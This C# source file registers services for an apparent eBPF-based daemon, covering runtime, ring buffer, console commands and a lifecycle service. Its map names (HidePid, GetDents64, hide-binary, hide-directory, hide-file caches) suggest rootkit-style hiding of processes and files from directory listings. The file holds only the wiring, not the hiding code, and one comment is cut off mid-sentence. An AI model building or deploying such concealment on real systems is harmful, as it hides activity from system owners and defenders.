using Deamon.Cmd;
using Deamon.Cmd.Abstraction;
using Deamon.Cmd.Commands;
using Deamon.Ebpf.Abstraction;
using Deamon.Ebpf.Events;
using Deamon.Ebpf.Mapping;
using Deamon.Ebpf.Runtime;
using Deamon.Utils;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;

namespace Deamon.Ebpf;

public static class EbpfServiceCollectionExtensions
{
    public static IServiceCollection AddEbpf(this IServiceCollection services, EbpfConfiguration ebpfConfiguration, IConfiguration configuration)
    {
        //check config.
        ArgumentNullException.ThrowIfNull(ebpfConfiguration);
        ArgumentException.ThrowIfNullOrWhiteSpace(ebpfConfiguration.ProgramName);
        ArgumentException.ThrowIfNullOrWhiteSpace(ebpfConfiguration.ProgramPath);

        //inject config.
        services.AddSingleton(ebpfConfiguration);
        services.AddSingleton(configuration);

        //Byte comparer
        services.AddSingleton<ByteArrayComparer>();

        //maps.
        services.AddSingleton<IEbpfMapConfig, MapRingbuffer>();
        services.AddSingleton<IEbpfMapConfig, MapHidePid>();
        services.AddSingleton<IEbpfMapConfig, MapGetDents64>();

        services.AddSingleton<IEbpfMapConfig, MapCacheHideBin>();
        services.AddSingleton<IEbpfMapConfig, MapCacheHideDir>();
        services.AddSingleton<IEbpfMapConfig, MapCacheHideFile>();
        //-----------------------------------------------------

        //EbfRuntime receive IEnumerable<IIEbpfMapConfig>
        services.AddSingleton<EbpfRuntime>();
 
        //same instance behind the interface, or the reader would listen to a
        services.AddSingleton<IEbpfRawEventSource>(sp => (IEbpfRawEventSource)sp.GetRequiredService<EbpfRuntime>());
        services.AddSingleton<IEbpfMapActions>(sp => (IEbpfMapActions)sp.GetRequiredService<EbpfRuntime>());
        services.AddSingleton<IEbpfProgramActions>(sp => (IEbpfProgramActions)sp.GetRequiredService<EbpfRuntime>());
        services.AddSingleton<IEbpfEventReader, EbpfEventReader>();

        //commands
        services.AddSingleton<ICmdCommand, MapCommand>();
        services.AddSingleton<ICmdCommand, ProgCommand>();
        services.AddSingleton<ICmdCommand, QuitCommand>();
        services.AddSingleton<ICmdCommand, ClearCommand>();

        services.AddSingleton<EbpfDebugConfig>();

        //Command registry receive IEnumerable<ICmdCommand>
        services.AddSingleton<CommandRegistry>();
 
        //order matters : the lifecycle service must create the ring buffer
        //before the logger starts draining it.
        services.AddHostedService<EbpfLifecycleService>();
        return services;
    }
}